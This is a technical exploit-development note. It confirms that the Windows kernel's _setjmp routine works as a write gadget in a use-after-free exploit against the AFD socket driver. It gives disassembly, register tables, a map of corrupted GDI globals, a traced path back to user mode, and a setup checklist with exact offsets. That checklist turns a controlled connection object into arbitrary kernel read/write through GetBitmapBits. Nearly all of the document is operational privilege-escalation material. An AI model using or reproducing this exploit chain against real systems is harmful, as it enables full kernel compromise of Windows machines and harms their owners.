# _setjmp Write Gadget Verification for AFD UAF Exploit

## Executive Summary

**_setjmp (0x140408ed0) is a VIABLE write gadget.** It writes RBX to [RCX+8] and returns 0 via `xor eax, eax; retn`. The post-gadget path in AfdCloseConnection is survivable with a zeroed fake transport buffer. The full return path to user mode does not touch any corrupted GDI globals. The race window to GetBitmapBits is tight but winnable in a single-threaded exploit.

---

## THING 1: Post-Gadget Path in AfdCloseConnection

### Call Site Disassembly (afd.sys, pid 18576)

```
; RDI = conn (connection object, set at prologue)
; ESI = 2 (literal, set at 0x1c0056d8b)

0x1c0056dc3: mov rax, [rdi+8]              ; rax = *(conn + 0x08)
0x1c0056dc7: mov rbx, [rax+0F8h]           ; rbx = *(*(conn+0x08) + 0xF8) = TRANSPORT OBJ
0x1c0056dce: lock xadd [rbx+10h], esi      ; [transport+0x10] += 2 (refcount inc, 32-bit)
0x1c0056dd3: mov rcx, [rdi+10h]            ; rcx = *(conn + 0x10) = FIRST ARG TO GADGET
0x1c0056dd7: lea rax, AfdTLCloseConnectionHandleComplete
0x1c0056dde: mov [rsp+38h+var_18], rax     ; v13[0] = callback
0x1c0056de3: lea rdx, [rsp+38h+var_18]     ; rdx = &v13 = SECOND ARG TO GADGET
0x1c0056de8: mov rax, [rdi+18h]            ; rax = *(conn + 0x18)
0x1c0056dec: mov [rsp+38h+var_10], rdi     ; v13[1] = conn
0x1c0056df1: mov rax, [rax]                ; rax = *(*(conn+0x18)) = FUNCTION POINTER
0x1c0056df4: call cs:__guard_dispatch_icall_fptr  ; CFG call: RAX=_setjmp, RCX=gpHM-8, RDX=&v13
```

### Register State at Gadget Call

| Register | Value | Source |
|----------|-------|--------|
| RAX | _setjmp address | `*(*(conn+0x18))` (CFG target) |
| RCX | gpHandleManager - 8 | `*(conn + 0x10)` (our controlled value, jmp_buf ptr) |
| RDX | &v13 (stack local) | `lea rdx, [rsp+38h+var_18]` |
| RBX | our fake table addr | `*(*(conn+0x08) + 0xF8)` (transport obj, our controlled value) |
| RSI | 2 | `mov esi, 2` at 0x1c0056d8b |
| RDI | conn | `mov rdi, rcx` at 0x1c0056d88 |
| RBP | unknown | inherited from caller (AfdCloseCore) |
| R12-R15 | unknown | inherited from caller chain |

### After Gadget Returns (0x1c0056dfa)

```
0x1c0056dfa: mov rcx, rbx                  ; rcx = rbx = OUR FAKE TABLE (setjmp saves, doesn't modify)
0x1c0056dfd: call AfdTlDereferenceTransport ; AfdTlDereferenceTransport(fake_table)
0x1c0056e02: mov rbx, [rsp+38h+arg_0]      ; restore original rbx from stack
0x1c0056e07: mov rsi, [rsp+38h+arg_8]      ; restore original rsi from stack
0x1c0056e0c: mov rdi, [rsp+38h+arg_10]     ; restore original rdi from stack
0x1c0056e11: add rsp, 30h
0x1c0056e15: pop r14
0x1c0056e17: retn                           ; return to AfdCloseCore
```

**Key insight**: _setjmp saves registers to the jmp_buf but does NOT modify the register values themselves. RBX still contains our fake table address after _setjmp returns. The epilogue restores original RBX/RSI/RDI from the stack (saved in prologue at 0x1c0056d6f-0x1c0056d77), which are unaffected by _setjmp.

### AfdTlDereferenceTransport Analysis (0x1c0003970)

```c
void __fastcall AfdTlDereferenceTransport(__int64 a1)
{
  if ( a1 != &WskTdiTransport                              // 0x1C002A0D0
    && _InterlockedExchangeAdd((signed __int32 *)(a1 + 16), 0xFFFFFFFE) == 3 )
  {
    NmrClientDetachProviderComplete(*(HANDLE *)(a1 + 64)); // a1+0x40
  }
}
```

Disassembly:
```
sub rsp, 28h
lea rax, WskTdiTransport          ; rax = 0x1C002A0D0
cmp rcx, rax                      ; compare our fake table with WskTdiTransport
jz short loc_1C0003993            ; if EQUAL -> clean return (skip everything)
mov eax, 0FFFFFFFEh               ; eax = -2 (32-bit)
lock xadd [rcx+10h], eax          ; old = [fake_table+0x10]; [fake_table+0x10] += -2 (32-bit!)
cmp eax, 3                        ; was old value 3?
jz loc_1C000D2D4                  ; if YES -> call NmrClientDetachProviderComplete(*(rcx+0x40))
loc_1C0003993:
add rsp, 28h
retn                              ; CLEAN RETURN
loc_1C000D2D4:
mov rcx, [rcx+40h]               ; NmrBindingHandle = *(fake_table + 0x40)
call cs:__imp_NmrClientDetachProviderComplete  ; WOULD CRASH with invalid handle
jmp loc_1C0003993
```

### Fields Accessed on Transport Object

| Offset | Size | Access | Purpose |
|--------|------|--------|---------|
| +0x10 | 4 bytes (DWORD) | Read/Write (atomic) | Reference count (InterlockedExchangeAdd -2) |
| +0x40 | 8 bytes (QWORD) | Read (only if refcount was 3) | NMR binding handle (NmrClientDetachProviderComplete arg) |

### Survival Condition for AfdTlDereferenceTransport

The pre-gadget `lock xadd [rbx+10h], esi` at 0x1c0056dce adds +2 to [fake_table+0x10] (32-bit operation using ESI=2).

The post-gadget AfdTlDereferenceTransport does `lock xadd [rcx+10h], -2` (32-bit).

| Initial [fake_table+0x10] | After pre-gadget (+2) | AfdTlDeref old val (-2) | old == 3? | Result |
|---------------------------|----------------------|------------------------|-----------|--------|
| 0 | 2 | 2 | No | **CLEAN RETURN** |
| 1 | 3 | 3 | Yes | **CRASH** (NmrClientDetachProviderComplete) |
| 2 | 4 | 4 | No | CLEAN RETURN |
| 0xFFFFFFFF | 1 | 1 | No | CLEAN RETURN |

**Requirement**: Set [fake_table+0x10] to 0 (zeroed pool buffer naturally satisfies this).

**Can we fake a transport to survive?** YES. A zeroed big pool buffer sprayed at the right address satisfies all conditions:
- fake_table != WskTdiTransport (0x1C002A0D0) — pool buffer won't match this afd.sys global
- [fake_table+0x10] = 0 → after +2 = 2, after -2 returns old=2, 2 != 3 → skip NmrClientDetachProviderComplete
- [fake_table+0x40] is never read because the == 3 check fails

**WskTdiTransport address**: 0x1C002A0D0 (afd.sys global). Cannot match this with a pool buffer, but we don't need to.

---

## THING 2: Collateral Damage from _setjmp

### _setjmp Complete Write Map (ntoskrnl.exe, pid 4024)

Confirmed from disassembly at 0x140408ed0:

```
mov [rcx], rdx              ; +0x00: RDX (8 bytes)
mov [rcx+8], rbx            ; +0x08: RBX (8 bytes)  *** THE GOAL ***
mov [rcx+18h], rbp          ; +0x18: RBP (8 bytes)
mov [rcx+20h], rsi          ; +0x20: RSI (8 bytes)
mov [rcx+28h], rdi          ; +0x28: RDI (8 bytes)
mov [rcx+30h], r12          ; +0x30: R12 (8 bytes)
mov [rcx+38h], r13          ; +0x38: R13 (8 bytes)
mov [rcx+40h], r14          ; +0x40: R14 (8 bytes)
mov [rcx+48h], r15          ; +0x48: R15 (8 bytes)
lea r8, [rsp+arg_0]         ; r8 = RSP+8 (stack ptr after return)
mov [rcx+10h], r8           ; +0x10: RSP+8 (8 bytes)
mov r8, [rsp+0]             ; r8 = return address
mov [rcx+50h], r8           ; +0x50: RIP (8 bytes)
stmxcsr dword ptr [rcx+58h] ; +0x58: MXCSR (4 bytes ONLY — +0x5C to +0x5F UNTOUCHED)
movdqa [rcx+60h], xmm6      ; +0x60: XMM6 (16 bytes)
movdqa [rcx+70h], xmm7      ; +0x70: XMM7 (16 bytes)
movdqa [rcx+80h], xmm8      ; +0x80: XMM8 (16 bytes)
movdqa [rcx+90h], xmm9      ; +0x90: XMM9 (16 bytes)
movdqa [rcx+A0h], xmm10     ; +0xA0: XMM10 (16 bytes)
movdqa [rcx+B0h], xmm11     ; +0xB0: XMM11 (16 bytes)
movdqa [rcx+C0h], xmm12     ; +0xC0: XMM12 (16 bytes)
movdqa [rcx+D0h], xmm13     ; +0xD0: XMM13 (16 bytes)
movdqa [rcx+E0h], xmm14     ; +0xE0: XMM14 (16 bytes)
movdqa [rcx+F0h], xmm15     ; +0xF0: XMM15 (16 bytes)
xor eax, eax                ; return 0
retn
```

**Total write span**: [RCX+0x00] to [RCX+0xFF] = 256 bytes
**4-byte gap**: [RCX+0x5C] to [RCX+0x5F] — upper bytes after MXCSR write are NOT touched

### Address Math (RCX = gpHandleManager - 8)

gpHandleManager RVA = 0x250C00 (confirmed: `?gpHandleManager@@3PEAVGdiHandleManager@@EA` at 0x1C0250C00)
RCX RVA = 0x250C00 - 8 = 0x250BF8

win32kbase.sys image base = 0x1C0000000
Segment: .data (RVA 0x245000 - 0x259000, permissions = 6 = READ|WRITE)

### Corrupted Globals Map

| RVA | Offset from gpHM | Global Name | Overwrite Value | Size | Danger |
|-----|-------------------|-------------|-----------------|------|--------|
| 0x250BF8 | -8 | gpRGBXlate (uchar*) | RDX = &v13 (afd.sys stack addr) | 8 | LOW |
| **0x250C00** | **0** | **gpHandleManager (GdiHandleManager*)** | **RBX = FAKE TABLE** | **8** | *** GOAL *** |
| 0x250C08 | +8 | gpTmpGlobal (PVOID) | RSP+8 (kernel stack ptr) | 8 | MEDIUM |
| 0x250C10 | +0x10 | gGDISessionLimitReachedAtLeastOnce (U8) | RBP (kernel base ptr) | 8 | LOW |
| 0x250C18 | +0x18 | gpentHmgr (_ENTRY*) | **RSI = 2** (literal!) | 8 | **HIGH** |
| 0x250C20 | +0x20 | gpGdiDevCaps | RDI = conn (afd connection obj) | 8 | LOW |
| 0x250C28 | +0x28 | gMaxGdiHandleCount (ULONG) | R12 | 8 | LOW |
| 0x250C30 | +0x30 | GreEngLoadModuleAllocListLock (HSEMAPHORE*) | R13 | 8 | MEDIUM |
| 0x250C38 | +0x38 | gbGreSessionCleanup (BOOL) | R14 | 8 | LOW |
| 0x250C40 | +0x40 | MultiUserEngAllocListLock (HSEMAPHORE*) | R15 | 8 | MEDIUM |
| 0x250C48 | +0x48 | (no named global) | RIP = 0x1c0056dfa | 8 | LOW |
| 0x250C50 | +0x50 | gulDriverFailureReason (ULONG) | MXCSR (4 bytes only) | 4 | LOW |
| 0x250C54 | +0x54 | (upper 4 bytes of above) | **UNTOUCHED** (gap) | 4 | NONE |
| 0x250C58 | +0x58 | gpDevicesPerLuid (uchar*) | XMM6 | 16 | LOW |
| 0x250C68 | +0x68 | (between globals) | XMM7 | 16 | LOW |
| 0x250C78 | +0x78 | gDrvDpiWin8Style (int) | XMM8 | 16 | LOW |
| 0x250C88 | +0x88 | gpReferenceTracker (CReferenceTracker*) | XMM9 | 16 | LOW |
| 0x250C98 | +0x98 | (unnamed) | XMM10 | 16 | LOW |
| 0x250CA8 | +0xA8 | (HidP function ptrs start) | XMM11 | 16 | LOW |
| 0x250CB8 | +0xB8 | gpfnHidP_GetLinkCollectionNodes | XMM12 | 16 | LOW |
| 0x250CC8 | +0xC8 | gpfnHidP_GetCaps | XMM13 | 16 | LOW |
| 0x250CD8 | +0xD8 | gpfnHidP_GetUsageValueArray | XMM14 | 16 | LOW |
| 0x250CE8 | +0xE8 | gpfnHidP_GetUsages | XMM15 | 16 | LOW |

### Critical Collateral Damage Assessment

**HIGH RISK**: gpentHmgr (RVA 0x250C18) = RSI = 2
- RSI is literally 2 (from `mov esi, 2` at 0x1c0056d8b, zero-extended to 64-bit)
- gpentHmgr is the GDI handle table entry pointer
- Any GDI handle lookup will dereference this as a base pointer → immediate crash at address ~0x2
- **This is the most dangerous corruption**, but only matters if GDI code runs before GetBitmapBits

**MEDIUM RISK**: gpTmpGlobal (RVA 0x250C08) = kernel stack pointer
- gpTmpGlobal is a temporary global pointer used in GDI
- Corrupted with RSP+8 (a kernel stack address from AfdCloseConnection's frame)
- Would be a valid kernel address, but wrong data — could cause subtle corruption if accessed

**MEDIUM RISK**: Lock pointers (GreEngLoadModuleAllocListLock, MultiUserEngAllocListLock)
- Overwritten with R13/R15 (unknown caller values)
- If any GDI code tries to acquire these locks, it'll dereference garbage → crash

**LOW RISK**: HID function pointers (0x250CA8 - 0x250CE8)
- Overwritten with XMM11-XMM15 (SIMD register values)
- Only accessed when HID operations are performed (very unlikely in the race window)

**Will corrupting these cause an immediate crash?**
NO — not during the return path. All corrupted globals are in win32kbase.sys .data (GDI subsystem). The return path goes through afd.sys → ntoskrnl → user mode, which does NOT execute any GDI code. The crash would only occur if another thread performs GDI operations (creating/selecting DCs, drawing, etc.) before we reach GetBitmapBits.

---

## THING 3: Full Survival Path to GetBitmapBits

### Complete Return Path Trace

```
_setjmp (ntoskrnl @ 0x140408ed0)
  ├── writes RBX to [RCX+8] = [gpHandleManager]  ← CORRUPTION COMPLETE
  ├── writes 252 more bytes to [gpHM-8 .. gpHM+0xF7]  ← COLLATERAL DAMAGE
  └── xor eax, eax; retn  → returns 0 to AfdCloseConnection

AfdCloseConnection (afd.sys @ 0x1C0056D6C)
  ├── mov rcx, rbx              ; RCX = fake table (RBX unchanged by setjmp)
  ├── call AfdTlDereferenceTransport(fake_table)
  │   ├── cmp fake_table, WskTdiTransport (0x1C002A0D0)  → NOT EQUAL
  │   ├── lock xadd [fake_table+0x10], -2  → old=2 (was 0, +2 from pre-gadget), 2≠3
  │   └── SKIP NmrClientDetachProviderComplete  → CLEAN RETURN ✓
  ├── mov rbx, [rsp+arg_0]      ; restore original rbx from stack (unaffected)
  ├── mov rsi, [rsp+arg_8]      ; restore original rsi from stack (unaffected)
  ├── mov rdi, [rsp+arg_10]     ; restore original rdi from stack (unaffected)
  ├── add rsp, 30h
  ├── pop r14
  └── retn  → returns to AfdCloseCore

AfdCloseCore (afd.sys @ 0x1c0037350)
  ├── *((QWORD*)&ListEntry[20].Next + 1) = v3   ; store connection ptr (AFD-internal)
  ├── BYTE2(ListEntry->Next) = 6                ; set state flag (AFD-internal)
  ├── AFDETW_TRACECLOSE(1, 2001, ListEntry)     ; ETW trace (AFD-internal, no GDI)
  ├── AfdDereferenceEndpointInline(ListEntry)
  │   ├── InterlockedExchangeAdd(&ListEntry refcount, -1)
  │   ├── if refcount == 0:
  │   │   ├── if AFD endpoint and IRQL == 0:
  │   │   │   ├── AfdFreeEndpointResources()    ; AFD-internal cleanup
  │   │   │   ├── lookaside list push or free   ; AFD pool operations
  │   │   │   └── NO GDI ACCESS
  │   │   └── else: queue work item (AfdFreeEndpoint/AfdFreeEndpointTditl)
  │   └── NO GDI ACCESS in any path
  └── return 0  → returns to AfdClose

AfdClose (afd.sys @ 0x1c0037304)
  └── return AfdCloseCore result  → returns to I/O Manager

I/O Manager (ntoskrnl)
  ├── Complete IRP_MJ_CLOSE
  ├── Free IRP
  ├── Return to object manager (handle table cleanup)
  └── Return through syscall dispatcher → IRETQ/SYSEXIT

USER MODE
  ├── NtClose returns
  └── IMMEDIATELY call GetBitmapBits/SetBitmapBits
      ├── Enters win32k → win32kbase
      ├── Uses gpHandleManager (now = our fake table)
      ├── Fake table maps bitmap handle → controlled kernel address
      └── ARBITRARY KERNEL R/W ACHIEVED ✓
```

### Does the caller do anything that might crash?

**No.** Every function in the return path operates exclusively on AFD-internal structures:
- AfdCloseConnection: operates on connection object (conn), transport object (our fake table)
- AfdCloseCore: operates on endpoint (ListEntry), calls ETW trace and AfdDereferenceEndpointInline
- AfdDereferenceEndpointInline: operates on endpoint refcount, AFD lookaside pools, or queues work items
- AfdClose: thin wrapper, just returns AfdCloseCore's result
- I/O Manager: generic IRP completion, no GDI knowledge

**None of these touch win32kbase.sys or any GDI handle manager globals.**

### Does execution return to user mode?

**Yes.** The full chain is:
1. User mode calls `NtClose(socketHandle)` 
2. I/O manager dispatches IRP_MJ_CLOSE to `AfdClose`
3. `AfdClose` → `AfdCloseCore` → `AfdCloseConnection` → gadget fires → `AfdTlDereferenceTransport` → clean return
4. Unwinds back through `AfdCloseCore` → `AfdClose` → I/O manager
5. I/O manager completes IRP, returns to syscall dispatcher
6. `NtClose` returns to user mode

### Race Window Analysis

The corrupted globals are all GDI subsystem variables. The race is:
- **Winner**: our user-mode thread calling GetBitmapBits immediately after NtClose returns
- **Loser**: any other thread (or same thread) performing GDI operations

In a single-threaded exploit with no GDI operations between NtClose and GetBitmapBits, the race is won trivially. The kernel return path does not preempt to run GDI code.

**Risk factors**:
- Other processes/threads performing GDI operations (CreateCompatibleDC, SelectObject, etc.) could touch gpentHmgr (=2) and BSOD
- Window manager / GDI batch thread could periodically flush and access handle manager
- In practice, the window between NtClose return and GetBitmapBits call is microseconds — survivable

### Fake Transport Setup Requirements

The big pool spray buffer used as the fake transport/table must have:

| Offset | Required Value | Purpose |
|--------|---------------|---------|
| +0x00 | (fake table data for gpHandleManager override) | This IS the fake handle manager table |
| +0x10 | 0 (DWORD, 4 bytes) | Refcount — must NOT be 1 (so +2≠3) |
| +0x40 | N/A (never read) | Only read if refcount was exactly 3 |

A zeroed pool buffer naturally satisfies [fake_table+0x10] = 0.

---

## VERDICT

| Check | Result |
|-------|--------|
| _setjmp writes RBX to [RCX+8]? | **YES** — confirmed at 0x140408ed3: `mov [rcx+8], rbx` |
| _setjmp returns cleanly? | **YES** — `xor eax, eax; retn` returns 0 |
| Post-gadget AfdTlDereferenceTransport survivable? | **YES** — set [fake_table+0x10] = 0, refcount 0→2→0, 2≠3, clean return |
| Collateral damage survivable? | **YES** — all corruption in win32kbase .data (GDI), return path avoids GDI |
| Full return path to user mode? | **YES** — AfdCloseConnection → AfdCloseCore → AfdClose → I/O mgr → user mode, no GDI access |
| Can reach GetBitmapBits? | **YES** — NtClose returns, immediately call GetBitmapBits, win race in single-threaded exploit |

**_setjmp is confirmed as a working write gadget for this AFD UAF exploit.**

### Setup Checklist
- [ ] conn+0x10 = gpHandleManager - 8 (becomes RCX = jmp_buf pointer)
- [ ] *(conn+0x08) + 0xF8 = fake table address (becomes RBX, written to [gpHandleManager])
- [ ] *(*(conn+0x18)) = _setjmp address (becomes RAX = CFG call target)
- [ ] fake_table+0x10 = 0 (zeroed buffer, refcount survival)
- [ ] Call NtClose to trigger AfdClose → AfdCloseCore → AfdCloseConnection → gadget
- [ ] Immediately call GetBitmapBits after NtClose returns
